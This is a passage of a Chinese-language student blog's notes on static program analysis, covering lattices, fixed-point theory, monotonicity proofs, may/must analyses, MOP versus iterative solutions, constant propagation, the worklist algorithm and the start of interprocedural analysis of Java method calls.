          <a href="#1-偏序-Partial-Order" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-偏序-Partial-Order" class="headerlink" title="1.偏序(Partial Order)"></a>1.偏序(Partial Order)</h2>
      <p><code>poset</code>偏序集</p>
<p>性质：<br>$$<br>\begin{align}<br>&amp;\forall x \in P,x\subseteq x\quad &amp;(Reflexivity)\<br>&amp;\forall x,y \in P,x\subseteq y ∧ y\subseteq x =&gt;x=y\quad &amp;(Antisymmetry)\<br>&amp;\forall x,y,z\in P,x\subseteq y ∧ y\subseteq z =&gt;x \subseteq z \quad &amp;(Transitivity)<br>\end{align}<br>$$</p>

        <h2 id="2-Upper-and-Lower-Bounds"   >
          <a href="#2-Upper-and-Lower-Bounds" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-Upper-and-Lower-Bounds" class="headerlink" title="2.Upper and Lower Bounds"></a>2.Upper and Lower Bounds</h2>
      <p>$$<br>u\in P,u\ is \ an \ upper\ bound\ of\ S,if\ \forall x\in S,x\subseteq u\<br>l\in P,l\ is \ an \ lower\ bound\ of\ S,if\ \forall x\in S,l\subseteq x\<br>$$</p>
<ul>
<li><p><code>lub/join(least upper bound)</code></p>
<p><code>lub</code>定义符号为<code>⊔S</code>，满足<code>⊔S ⊑ u</code>，<code>u</code>为上界</p>
</li>
<li><p><code>glb/meet(greatest lower bound)</code></p>
<p><code>glb</code>定义符号为<code>⊓S</code>，满足<code>l ⊑ ⊓S</code>，</p>
</li>
<li><p>如果<code>S ⊑ P(P,⊑)  </code>，并且<code>S</code>只有两个元素，假定为<code>S=&#123;a,b&#125;</code>，那么可得如下</p>
<ul>
<li><code>⊔S = a⊔b  (join)</code></li>
<li><code>⊓S = a⊓b  (meet)</code></li>
</ul>
</li>
<li><p>不是所有偏序集都有最大下界或者最小上界</p>
</li>
<li><p>如果一个偏序集有最大下界或者最小上界，那么一定是唯一的</p>
</li>
</ul>

        <h2 id="3-Lattice"   >
          <a href="#3-Lattice" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-Lattice" class="headerlink" title="3.Lattice"></a>3.Lattice</h2>
      
        <h3 id="Lattice-格"   >
          <a href="#Lattice-格" class="heading-link"><i class="fas fa-link"></i></a><a href="#Lattice-格" class="headerlink" title="Lattice(格)"></a>Lattice(格)</h3>
      <p>如果一个偏序集中任意两个元素组成一个集合，都有最小上界和最大下界存在，那么该偏序集即为一个<code>lattice</code></p>
<p><code>P(P,⊑), ∀a,b∈P, a⊔b and a⊓b exists =&gt; P is a lattice </code></p>

        <h3 id="Semilattice-半格"   >
          <a href="#Semilattice-半格" class="heading-link"><i class="fas fa-link"></i></a><a href="#Semilattice-半格" class="headerlink" title="Semilattice(半格)"></a>Semilattice(半格)</h3>
      <p>如果一个偏序集中任意两个元素组成一个集合，最小上界和最大下界中只有一个存在，那么该偏序集即为一个<code>Semilattice</code></p>
<ul>
<li><code>join semilattic</code>：<code>a⊔b</code>存在，<code>a⊓b</code>不存在</li>
<li><code>meet semilattic</code>：<code>a⊓b</code>存在，<code>a⊔b</code>不存在</li>
</ul>

        <h3 id="Complete-Lattic-全格"   >
          <a href="#Complete-Lattic-全格" class="heading-link"><i class="fas fa-link"></i></a><a href="#Complete-Lattic-全格" class="headerlink" title="Complete Lattic(全格)"></a>Complete Lattic(全格)</h3>
      
        <h4 id="定义：-2"   >
          <a href="#定义：-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#定义：-2" class="headerlink" title="定义："></a>定义：</h4>
      <p>如果对于一个偏序集中任意一个子集，都有最小上界和最大下界存在，那么该偏序集即为一个<code>Complete Lattice</code></p>
<p>每一个全集都有一个最大元素和最小元素</p>
<ul>
<li>最大元素<code>(a greatest element T) = ⊔P = top</code></li>
<li>最小元素<code>(a least element ⊥) = ⊓P = bottom</code></li>
</ul>

        <h4 id="性质："   >
          <a href="#性质：" class="heading-link"><i class="fas fa-link"></i></a><a href="#性质：" class="headerlink" title="性质："></a>性质：</h4>
      <p>所有有限的<code>Lattice</code>都是<code>Complete Lattic</code>，但是一个<code>Complete Lattic</code>不一定是有限的，比如<code>0-1</code>这个偏序集中所有实数(包括0,1)作为一个集合，存在边界，是一个<code>Complete Lattic</code>，但是里面的子集的元素就可以是无限的。</p>

        <h3 id="Product-Lattice"   >
          <a href="#Product-Lattice" class="heading-link"><i class="fas fa-link"></i></a><a href="#Product-Lattice" class="headerlink" title="Product Lattice"></a>Product Lattice</h3>
      <p>一个<code>Lattice</code>合集，其中所有<code>Lattice</code>都由最小上界和最大上界，那么即可称该<code>Lattice</code>合集为一个<code>Product Lattice</code></p>

        <h2 id="4-Fixed-Point"   >
          <a href="#4-Fixed-Point" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-Fixed-Point" class="headerlink" title="4.Fixed-Point"></a>4.Fixed-Point</h2>
      
        <h3 id="Monotonicity-单调"   >
          <a href="#Monotonicity-单调" class="heading-link"><i class="fas fa-link"></i></a><a href="#Monotonicity-单调" class="headerlink" title="Monotonicity(单调)"></a>Monotonicity(单调)</h3>
      <p>对于一个<code>Lattice L</code>，有函数<code>f:∀x∈L,f(x)∈L</code>，假定该函数存在单调性，则<code>L</code>满足单调</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">∀x,y∈L,x⊑y =&gt; f(x)⊑f(y)</span><br></pre></td></tr></table></div></figure>

<p>🔺<strong>mark：那单调性怎么证明呢？</strong></p>

        <h3 id="Fixed-Point-Theorem-不动点理论"   >
          <a href="#Fixed-Point-Theorem-不动点理论" class="heading-link"><i class="fas fa-link"></i></a><a href="#Fixed-Point-Theorem-不动点理论" class="headerlink" title="Fixed-Point Theorem(不动点理论)"></a>Fixed-Point Theorem(不动点理论)</h3>
      <p>给定一个<code>Complete Lattice L</code>，<code>L</code>满足单调且有限，那么可以用来求不动点</p>

        <h4 id="最小不动点"   >
          <a href="#最小不动点" class="heading-link"><i class="fas fa-link"></i></a><a href="#最小不动点" class="headerlink" title="最小不动点"></a>最小不动点</h4>
      
        <h5 id="含义"   >
          <a href="#含义" class="heading-link"><i class="fas fa-link"></i></a><a href="#含义" class="headerlink" title="含义"></a>含义</h5>
      <p>$$<br>f(⊥),f(f(⊥)),…..,f^k(⊥)会达到最小不动点<br>$$</p>

        <h5 id="证明"   >
          <a href="#证明" class="heading-link"><i class="fas fa-link"></i></a><a href="#证明" class="headerlink" title="证明"></a>证明</h5>
      <ul>
<li><p>首先是存在不动点证明<br>$$<br>\begin{align}<br>&amp;\because\forall x,y\in L,x\subseteq y =&gt; f(x)\subseteq f(y)(Monntonicity)\<br>&amp;\therefore⊥\subseteq f(⊥)\<br>&amp;\therefore f(⊥)\subseteq f(f(⊥)) = f^2(⊥)\<br>&amp;\therefore ⊥\subseteq f(⊥) \subseteq f^2(⊥)\subseteq …\subseteq f^i(⊥)\<br>&amp;\because L\ is\ finite\<br>&amp;\therefore f^{Fix} = f^k(⊥) = f^{k+1}(⊥)<br>\end{align}<br>$$</p>
</li>
<li><p>然后是证明求得的不动点是最小不动点，还是不太理解提到的数学归纳法，既然从<code>⊥</code>开始做<code>f</code>，那么到某个<code>k</code>就必定存在不动点，那么将<code>x</code>也做<code>k</code>个<code>f</code>不就好了吗。</p>
<p>假定存在其他的不动点<code>x</code>，那么有<code>x = f(x),⊥⊑x</code><br>$$<br>\begin{align}<br>&amp;\because\forall x,y\in L,x\subseteq y =&gt; f(x)\subseteq f(y)(Monntonicity)\<br>&amp;\therefore f(⊥)\subseteq f(x)\<br>&amp;\therefore f^2(⊥)\subseteq f^2(x)…f^i(x)\subseteq f^i(x)\<br>&amp;\because \exist k,f^k(⊥) =  f^{Fix}\<br>&amp;\therefore f^{Fix} = f^k(⊥) \subseteq f^k(x)=x\<br>\end{align}<br>$$<br>那么就代表通过<code>⊥</code>求得的不动点一定是最小不动点，这里和李樾老师不一样，我也不知道能不能这么写，老师原版是数学归纳法<code>induction</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221231182008327.png" alt="image-20221231182008327"></p>
</li>
</ul>

        <h4 id="最大不动点"   >
          <a href="#最大不动点" class="heading-link"><i class="fas fa-link"></i></a><a href="#最大不动点" class="headerlink" title="最大不动点"></a>最大不动点</h4>
      
        <h5 id="含义-1"   >
          <a href="#含义-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#含义-1" class="headerlink" title="含义"></a>含义</h5>
      <p>$$<br>f(T),f(f(T)),…..,f^k(T)会达到最大不动点<br>$$</p>

        <h5 id="证明-1"   >
          <a href="#证明-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#证明-1" class="headerlink" title="证明"></a>证明</h5>
      <p>证明和最小不动点证明类似</p>

        <h2 id="5-应用"   >
          <a href="#5-应用" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-应用" class="headerlink" title="5.应用"></a>5.应用</h2>
      <p>这里把老师上课讲的放到最后了</p>

        <h3 id="理论应用"   >
          <a href="#理论应用" class="heading-link"><i class="fas fa-link"></i></a><a href="#理论应用" class="headerlink" title="理论应用"></a>理论应用</h3>
      <p>即依据<code>Lattice</code>的定义，将之前提到的算法中</p>
<ul>
<li><p>需要求的所有的<code>OUT/IN</code>当作一个元素<code>V(111..0000...)</code>，依据相关性质可知道该元素<code>V</code>为一个<code>Complete Lattice</code>，任意子集都有最大下界和最小上界，并且<code>finite</code><br>$$<br>&amp;OUT[B_1]&amp;OUT[B_2]&amp;…&amp;OUT[B_n]\<br>&amp;V_1 &amp;V_2&amp;…&amp;V_n<br>$$</p>
</li>
<li><p>将<code>Transfer function</code>作为刚刚提到的给定的<code>f</code>函数，其单调性需要证明，**(这里好像还没有证明)**那么每迭代一轮，就相当于对所有的<code>IN/OUT</code>做一次<code>Transfer function</code>。</p>
</li>
<li><p>将每一次迭代结果合并为一个集合<code>Xi</code>，可知该集合为一个<code>Product Lattice</code>，此外该<code>Product Lattice Xi(finite)</code>中所有元素均为一个<code>Complete Lattice</code>，那么该<code>Xi</code>也是一个<code>Complete Lattice</code>，然后加入<code>Transfer function</code>可得如下结果</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221231183658759.png" alt="image-20221231183658759"></p>
</li>
</ul>
<p>那么即可用到<code>Fixed-Point Theorem</code>(不动点)理论来求最终结果，回答如下问题</p>

        <h3 id="问题"   >
          <a href="#问题" class="heading-link"><i class="fas fa-link"></i></a><a href="#问题" class="headerlink" title="问题"></a>问题</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221231184741275.png" alt="image-20221231184741275"></p>
<ul>
<li>算法是否能够确保有解，可达不动点？</li>
<li>是否只有一个不动点，通过算法求解得到的不动点是否是最好的？</li>
<li>什么时候可以达到不动点？</li>
</ul>
<p>🔺<strong>mark：好像后面两个问题还没有解决</strong></p>

        <h1 id="五、Data-Flow-Analysis-Foundations-II"   >
          <a href="#五、Data-Flow-Analysis-Foundations-II" class="heading-link"><i class="fas fa-link"></i></a><a href="#五、Data-Flow-Analysis-Foundations-II" class="headerlink" title="五、Data Flow Analysis - Foundations II"></a>五、Data Flow Analysis - Foundations II</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114105134416.png" alt="image-20230114105134416"></p>

        <h2 id="1-Prove-Function-F-is-Monotonic"   >
          <a href="#1-Prove-Function-F-is-Monotonic" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-Prove-Function-F-is-Monotonic" class="headerlink" title="1.Prove Function F is Monotonic"></a>1.Prove Function F is Monotonic</h2>
      
        <h3 id="分析："   >
          <a href="#分析：" class="heading-link"><i class="fas fa-link"></i></a><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3>
      <p>一般而言<code>F</code>形式为<code>OUT/IN = gen ⊓/⊔ (IN/OUT - kill)</code></p>
<p>由于对于每一个基本块<code>BB</code>而言，<code>gen</code>和<code>kill</code>都是固定的，即为单调的常数，所以这里的需要证明的就是<code>⊓/⊔</code>是否为单调的，先证明<code>⊔</code>为单调，证明方法对<code>⊓</code>同理</p>

        <h3 id="证明如下："   >
          <a href="#证明如下：" class="heading-link"><i class="fas fa-link"></i></a><a href="#证明如下：" class="headerlink" title="证明如下："></a>证明如下：</h3>
      <p><code>⊔</code>定义：求任意两个元素的最小上界</p>
<p>想要证明<code>⊔</code>为单调，即转化为证明如下结论<br>$$<br>\forall x,y,z\in L,x\subseteq y\ =&gt;\ x⊔z\subseteq y⊔z<br>$$<br>证明过程：<br>$$<br>\begin{align}<br>&amp;\therefore y⊔z\ is\ an\ least\ upper\ bound\ of\  y\<br>&amp;\therefore y\subseteq y⊔z\<br>&amp;\because x\subseteq y\<br>&amp;\therefore x\subseteq y⊔z\ =&gt;\ y⊔z\ is\ an\ upper\  bound\ of\ x  \<br>&amp;\because x⊔z\ is\ an\ least\ upper\ bound\ of\ x\<br>&amp;\therefore x⊔z\subseteq y⊔z<br>\end{align}<br>$$<br>证毕</p>
<p>那么即可得到对于每一个基本块的<code>Function F</code>是单调的，由于每次迭代的时候的<code>f</code>即代表对每一个基本块做<code>Function F</code>，所以<code>f</code>也是单调的。</p>

        <h2 id="2-Time-Complexity"   >
          <a href="#2-Time-Complexity" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-Time-Complexity" class="headerlink" title="2.Time Complexity"></a>2.Time Complexity</h2>
      <p>即什么时候到达不动点</p>
<ul>
<li><p>偏序集高度<code>h</code>定义，从<code>Top</code>到<code>Bottom</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230103115752131.png" alt="image-20230103115752131"></p>
</li>
</ul>
<p>那么一个算法中有个<code>k</code>个<code>node</code>，最坏情况就是，每次迭代，只有一个<code>node</code>的一个<code>bit</code>从<code>0-&gt;1</code>。而<code>bit</code>的数量其实就是偏序集的高度<code>h</code>，从而得到最坏的情况就是迭代<code>h*k</code>次，从而把所有<code>node</code>的所有<code>bit</code>都从<code>0-&gt;1</code>，时间复杂度即为<code>h*k</code>。</p>

        <h2 id="3-May-and-Must-Analyses-a-Lattice-View"   >
          <a href="#3-May-and-Must-Analyses-a-Lattice-View" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-May-and-Must-Analyses-a-Lattice-View" class="headerlink" title="3.May and Must Analyses,a Lattice View"></a>3.May and Must Analyses,a Lattice View</h2>
      <p>将一个<code>Lattice</code>抽象称一个图形，如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230103154826254.png" alt="image-20230103154826254"></p>
<p><code>May Analysis/Must Analysis</code>基本都是从<code>unsafe-&gt;safe</code>的过程，也就是<code>safe-approximation</code>主要就是如下的图</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230103164006781.png" alt="image-20230103164006781"></p>
<ul>
<li><code>May</code>：<ul>
<li>从<code>Bottom-&gt;Top</code>，从不准确到准确，达到<code>Least Fixed Point</code>。</li>
<li>比如<code>Reaching Definition</code>，<code>unSafe</code>就是<code>No definitions can reach</code>到<code>safe</code>，也就是<code>All definitions may reach</code>的过程。 </li>
</ul>
</li>
<li><code>Must</code>：<ul>
<li>从<code>Top-&gt;Bottom</code>，也是从不准确到准确，达到<code>Greatest Fixed Point</code>。</li>
<li>比如<code>Expressions available</code>，它的<code>safe</code>就必须是<code>No expressions are available</code>。因为误报了一个<code>expression</code>是<code>available</code>的话，那么整个程序优化之后就会出错，所以它的<code>safe</code>只能是<code>No expressions are available</code>，然后即可推得其他的。</li>
</ul>
</li>
</ul>
<p>大概是懂了，但是如果再来设计一个算法，是依据什么原则或者什么方法来将它设计成<code>Must</code>还是<code>May</code>呢。</p>
<p>比如活跃变量分析，其应用通常是用来提高寄存器利用率的，用来求<code>dead</code>变量的，就算求不出来<code>dead</code>变量，其实对程序实际的运行结果并不会造成影响，所以应该设计成<code>May</code>。<strong>但是能不能设计成<code>Must</code>呢？</strong>设计成<code>Must</code>是会出错，还是会导致优化程度不够高呢，好像是后者把。</p>

        <h2 id="4-How-Precise-Is-Our-Solution"   >
          <a href="#4-How-Precise-Is-Our-Solution" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-How-Precise-Is-Our-Solution" class="headerlink" title="4.How Precise Is Our Solution"></a>4.How Precise Is Our Solution</h2>
      
        <h3 id="Meet-Over-All-Paths-Solution-MOP"   >
          <a href="#Meet-Over-All-Paths-Solution-MOP" class="heading-link"><i class="fas fa-link"></i></a><a href="#Meet-Over-All-Paths-Solution-MOP" class="headerlink" title="Meet-Over-All-Paths Solution(MOP)"></a>Meet-Over-All-Paths Solution(MOP)</h3>
      <p>即所有从<code>Entry</code>到该某点<code>Si</code>的<code>Path</code>的一些运算</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230103170419300.png" alt="image-20230103170419300"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MOP[Si] = ⊔/⊓  Fp(OUT[Entry])</span><br></pre></td></tr></table></div></figure>

<p>其中<code>Fp</code>代表从<code>Entry</code>到<code>Si</code>某条路径的所有<code>Transfer funstion</code>的一个集合函数。比如有一条路径为<code>Entry-&gt;S1-&gt;S2-&gt;...-&gt;Si</code>，那么整条路径从<code>Entry-&gt;Si-1</code>可得<code>OUT[Si-1] = Fp(OUT[Entry])</code></p>
<p><code>MOP[Si]</code>即求所有路径（当然不同路径的<code>Si-1</code>可能不同）到<code>Si</code>的一个<code>meet/join</code>，也就是将不同路径的<code>OUT[Si-1]</code>做一个<code>meet/join</code>操作。</p>
<p>有些<code>Path</code>在实际的动态运行过程中可能不存在，但是在静态分析时会将之归入进来计算。</p>

        <h3 id="MOP-vs-Ours-Iterative-Algorithm"   >
          <a href="#MOP-vs-Ours-Iterative-Algorithm" class="heading-link"><i class="fas fa-link"></i></a><a href="#MOP-vs-Ours-Iterative-Algorithm" class="headerlink" title="MOP vs Ours(Iterative Algorithm)"></a>MOP vs Ours(Iterative Algorithm)</h3>
      <p>假定如下情况</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230103173750413.png" alt="image-20230103173750413"></p>
<p>依据定义可分别得到对应的结果<br>$$<br>\begin{align}<br>&amp;Ours[S4]=IN[S4]=f_{s3}(f_{s1}(OUT[Entry])⊔f_{s2}(OUT[Entry]))\<br>&amp;MOP[S4]=IN[S4]=f_{s3}(f_{s1}(OUT[Entry]))⊔f_{s3}(f_{s2}(OUT[Entry]))<br>\end{align}<br>$$<br>其中<code>fs1(OUT[Entry])</code>和<code>fs2(OUT[Entry])</code>是一样的，那么将之抽象为<code>x</code>和<code>y</code>，<code>fs3</code>抽象为<code>F</code>可得简化后的结果</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ours = F(x⊔y)</span><br><span class="line">MOP  = F(x)⊔F(y)</span><br></pre></td></tr></table></div></figure>

<p>证明一下两者的关系<br>$$<br>\begin{align}<br>&amp;\therefore x\subseteq x⊔y\ and\ y\subseteq x⊔y\<br>&amp;\because ∀x,y\in L,x\subseteq y =&gt; F(x)\subseteq F(y)(Monotonic)\<br>&amp;\therefore F(x)\subseteq F(x⊔y)\ and\ F(x)\subseteq F(x⊔y)\<br>&amp;\therefore F(x⊔y)\ is\ an\ upper\ bound\ of\ F(x)\ and\ F(y)\<br>&amp;\because F(x)⊔F(y)\ is\ an\ least\ upper\ bound\ of\ F(x)\ and F(y)\<br>&amp;\therefore F(x)⊔F(y)\subseteq F(x⊔y)\<br>&amp;\therefore MOP\subseteq Ours<br>\end{align}<br>$$<br>又因为如下关系图</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230103164006781.png" alt="image-20230103164006781"></p>
<p>在<code>may analysis</code>中，越接近上界越不准确，所以<code>Ours</code>比<code>MOP</code>更加不准确</p>
<p>但是如果满足<code>Transfer function F </code>是<code>distributive</code>（可分配的），即分配律，那么可得<code>F(x⊔y) = F(x)⊔F(y)</code>的，那么<code>MOP=Ours</code>。即当<code>Transfer function</code>是可分配的，即代表<code>MOP</code>其实是等价于<code>Ours</code>的。</p>
<p><strong>有个结论：</strong></p>
<p><code>Bit-vector or Gen/Kill problems (set union/intersection for join/meet) are distributive</code></p>
<p>就是前面提到的关于<code>Bit-Vector</code>方法定义的，或者是<code>Gen/Kill</code>定义的<code>Transfer function</code>都是可以分配的</p>

        <h2 id="5-Constant-Propagation"   >
          <a href="#5-Constant-Propagation" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-Constant-Propagation" class="headerlink" title="5.Constant Propagation"></a>5.Constant Propagation</h2>
      <p>使用的是<code>MOP</code></p>

        <h3 id="Data-Flow-Facts-3"   >
          <a href="#Data-Flow-Facts-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#Data-Flow-Facts-3" class="headerlink" title="Data Flow Facts"></a>Data Flow Facts</h3>
      <p>将所有的变量是否为常量都表达为一个组合<code>pairs</code>，即<code>(x,v)</code>，也就是当前经过<code>node</code>之后的<code>OUT</code>中该变量<code>x</code>的值<code>v</code></p>

        <h3 id="Control-Flow-3"   >
          <a href="#Control-Flow-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#Control-Flow-3" class="headerlink" title="Control Flow"></a>Control Flow</h3>
      <p>和<code>Expression Analysis</code>一样，应该是<code>Must</code>的，因为<code>safe</code>的时候，应该是所有变量都不是常量，对应在<code>Bottom</code>，也就是<code>NAC(Not an constant)</code>。而由于是组合键值<code>pair</code>形式，所以<code>Top</code>应该是<code>undefine</code>，也就是<code>UNDEF</code>形式，最终如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230104113135782.png" alt="image-20230104113135782"></p>
<p>然后需要设计一下<code>Meet</code>操作，表达式同样类似</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IN[B] = ⊓p predecessor of B OUT[p]</span><br></pre></td></tr></table></div></figure>

<p>一个变量<code>v</code>与另一个进来的值对应的无非如下几种情况</p>
<ul>
<li><p><code>v ⊓ UNDEF = v</code></p>
<p>没定义的碰见另一个，当然直接相当于另一个了</p>
</li>
<li><p><code>v ⊓ NAC = NAC</code></p>
<p>既然已经确定不是常量，那么无论另一边值是啥，该变量必定不是常量了</p>
</li>
<li><p><code>v ⊓ constant</code></p>
<ul>
<li><p><code>c ⊓ c = c</code></p>
<p>两边均为常量才是常量</p>
</li>
<li><p><code>c1 ⊓ c2 = NAC</code></p>
<p>两边值不同就不是常量了</p>
</li>
<li><p><code>UNDEF ⊓ c = c</code>(和前面一样)</p>
</li>
<li><p><code>NAC ⊓ c = NAC</code>(和前面一样)</p>
</li>
</ul>
</li>
</ul>

        <h3 id="Transfer-Function-3"   >
          <a href="#Transfer-Function-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#Transfer-Function-3" class="headerlink" title="Transfer Function"></a>Transfer Function</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F: OUT[s] = gen⊔(IN[s] - &#123;(x, _)&#125;)</span><br></pre></td></tr></table></div></figure>

<p>即需要去掉所有其他<code>node</code>中关于变量<code>x</code>的键值对<code>pair</code>，然后加上当前生成的变量键值对<code>pair</code>。</p>
<p>使用函数<code>val(x)</code>来求对应<code>x</code>的值，然后对应不同的<code>statement</code>有如下情况</p>
<ul>
<li><code>s : x = constant;</code></li>
<li><code>s : x = y;</code></li>
<li><code>s : x = y op z;</code><ul>
<li><code>f(y,z) = val(y) op val(z) //val(y)和val(z)都是常量时</code></li>
<li><code>f(y,z) = NAC   //val(y)或者val(z)有一个是NAC时</code></li>
<li><code>f(y,z) = UNDEF  //其他情况</code></li>
</ul>
</li>
</ul>
<p> 是一个<code>Nondistributivity</code>，例子如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230104123407058.png" alt="image-20230104123407058"></p>

        <h3 id="Worklist-Algorithm"   >
          <a href="#Worklist-Algorithm" class="heading-link"><i class="fas fa-link"></i></a><a href="#Worklist-Algorithm" class="headerlink" title="Worklist Algorithm"></a>Worklist Algorithm</h3>
      <p>一个<code>Iterative Algorithm</code>的优化算法</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230104174021024.png" alt="image-20230104174021024"></p>
<p><code>Iterative Algorithm</code>只要变化了一个，其他的都会重新计算，而<code>Worklist Algorithm</code>是只计算当前轮次变化的<code>OUT[B]</code>以及后续的<code>OUT[B]</code>，相当于用空间换取时间。</p>
<p>原因就是一个<code>Transfer function</code>，<code>IN[]</code>没有变，那么<code>OUT[]</code>肯定也是没有变。</p>
<p>主要是图中黄色的部分，相比于<code>Iterative Algorithm</code>是有些改变的。</p>

        <h2 id="Foundations总结"   >
          <a href="#Foundations总结" class="heading-link"><i class="fas fa-link"></i></a><a href="#Foundations总结" class="headerlink" title="Foundations总结"></a>Foundations总结</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230104175311848.png" alt="image-20230104175311848"></p>
<p><code>Iterative algorithm</code>、<code>Lattice</code>定义、不动点理论、<code>may/must</code>分析、<code>MOP</code>和<code>Iterative algorithm</code>的异同比较、常量分析、<code>Worklist algorithm</code></p>

        <h1 id="六、Interprocedural-Analysis"   >
          <a href="#六、Interprocedural-Analysis" class="heading-link"><i class="fas fa-link"></i></a><a href="#六、Interprocedural-Analysis" class="headerlink" title="六、Interprocedural Analysis"></a>六、Interprocedural Analysis</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114105227045.png" alt="image-20230114105227045"></p>
<p>之前学的都是过程内分析<code>intraprocedural analysis</code>，接下来要学习过程间分析<code>Interprocedural Analysis</code>，即函数调用的相关分析</p>

        <h2 id="1-Motivation"   >
          <a href="#1-Motivation" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-Motivation" class="headerlink" title="1.Motivation"></a>1.Motivation</h2>
      <p>如果不进行相关的<code>Interprocedural Analysis</code>，那么当遇到函数调用时，通常解决办法都是<code>safe-approximation</code>，也就是将之判定为一个<code>safe</code>地方的<code>Facts</code>。比如对于<code>Constant Analysis</code>而言，就会函数调用返回的结果判定为<code>NAC</code>，更加安全。</p>

        <h3 id="一些定义："   >
          <a href="#一些定义：" class="heading-link"><i class="fas fa-link"></i></a><a href="#一些定义：" class="headerlink" title="一些定义："></a>一些定义：</h3>
      <p>如下所示，在函数之前存在相关的<code>call edges</code>，以及<code>return edges</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230104181215325.png" alt="image-20230104181215325"></p>

        <h2 id="2-Call-Graph-Construction"   >
          <a href="#2-Call-Graph-Construction" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-Call-Graph-Construction" class="headerlink" title="2.Call Graph Construction"></a>2.Call Graph Construction</h2>
      
        <h3 id="定义"   >
          <a href="#定义" class="heading-link"><i class="fas fa-link"></i></a><a href="#定义" class="headerlink" title="定义"></a>定义</h3>
      <p>调用图是程序中一个函数调用边<code>call edges</code>集合，比如如下所示，左边为程序，右边即为它的调用图</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230105112459293.png" alt="image-20230105112459293"></p>

        <h3 id="面向对象语言调用图常见算法"   >
          <a href="#面向对象语言调用图常见算法" class="heading-link"><i class="fas fa-link"></i></a><a href="#面向对象语言调用图常见算法" class="headerlink" title="面向对象语言调用图常见算法"></a>面向对象语言调用图常见算法</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230105112753506.png" alt="image-20230105112753506"></p>

        <h2 id="3-Method-Calls-Invocations-in-Java"   >
          <a href="#3-Method-Calls-Invocations-in-Java" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-Method-Calls-Invocations-in-Java" class="headerlink" title="3.Method Calls (Invocations) in Java"></a>3.Method Calls (Invocations) in Java</h2>
      <p>在<code>JAVA</code>中通常存在三种调用方法，而在<code>JAVA8</code>中还引入了<code>invokedynamic</code>，这个是特殊用途，不讨论</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230105113339502.png" alt="image-20230105113339502"></p>
<p>主要是对于<code>Vitual call</code>，一个调用由于传入的对象不同，可能对应不同的方法。这个是实现<code>OO(Object-Oriented)</code>语言中多态<code>polymorphism</code>的关键点，也是静态分析中的难点。</p>

        <h3 id="Method-Dispatch-of-Vitual-Calls"   >
          <a href="#Method-Dispatch-of-Vitual-Calls" class="heading-link"><i class="fas fa-link"></i></a><a href="#Method-Dispatch-of-Vitual-Calls" class="headerlink" title="Method Dispatch of Vitual Calls"></a>Method Dispatch of Vitual Calls</h3>
      
        <h4 id="定义-1"   >
          <a href="#定义-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#定义-1" class="headerlink" title="定义"></a>定义</h4>
      <p>即程序运行时动态求解<code>Vitual Calls</code>动态函数方法的过程，就叫做<code>Method Dispatch</code>，求解一般需要以下两个要素</p>
<ul>
<li>传入对象的类型</li>
<li>函数签名，<code>call site</code>不知道啥意思<ul>
<li><code>Signature = class type + method name + descriptor</code><ul>
<li><code>descriptor = return type + parameter types</code></li>
</ul>
</li>
</ul>
</li>
</ul>

        <h4 id="Dispatch-Function-Defination"   >
          <a href="#Dispatch-Function-Defination" class="heading-link"><i class="fas fa-link"></i></a><a href="#Dispatch-Function-Defination" class="headerlink" title="Dispatch Function Defination"></a>Dispatch Function Defination</h4>
